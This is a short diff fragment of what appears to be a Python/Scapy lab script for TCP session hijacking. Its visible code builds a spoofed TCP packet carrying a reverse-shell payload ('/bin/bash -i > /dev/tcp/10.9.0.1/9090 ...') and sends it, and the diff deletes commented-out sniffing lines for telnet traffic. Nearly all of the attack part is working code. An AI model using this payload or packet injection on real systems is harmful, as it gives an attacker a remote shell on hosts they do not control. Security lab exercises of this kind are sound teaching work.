@@ -10,9 +10,3 @@ data="\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"
 pkt = ip/tcp/data
 ls(pkt)
 send(pkt, verbose=0)
-
-    
-#iface=['br-fd2d696261de', 'enp0s3']
-#filter1 = 'tcp and port 23'
-#pkt = sniff(iface = ['br-fd2d696261de'], filter=filter1, prn=print_pkt)
-
